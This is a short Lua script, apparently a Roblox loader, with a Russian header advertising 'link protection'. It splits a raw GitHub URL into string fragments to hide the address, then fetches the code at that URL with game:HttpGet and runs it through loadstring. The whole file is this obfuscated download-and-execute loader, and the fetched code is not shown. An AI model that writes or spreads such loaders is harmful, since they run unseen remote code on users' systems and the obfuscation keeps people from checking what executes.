-- [ ЗАГРУЗЧИК v1.2 - С ЗАЩИТОЙ ССЫЛКИ ] --

local _u = "ht" .. "tp" .. "s:/" .. "/ra" .. "w.g" .. "it" .. "hu" .. "b." .. "co" .. "m/t" .. "ir" .. "vo" .. "x/m" .. "in" .. "e-" .. "a-" .. "mo" .. "un" .. "ta" .. "in" .. "/m" .. "ai" .. "n/" .. "scr" .. "ipt" .. ".l" .. "ua"

local script_code = "loadstring(game:HttpGet('" .. _u .. "'))()"

local func, err = loadstring(script_code)
if func then
    func()
else
    warn("Ошибка запуска: " .. tostring(err))
end
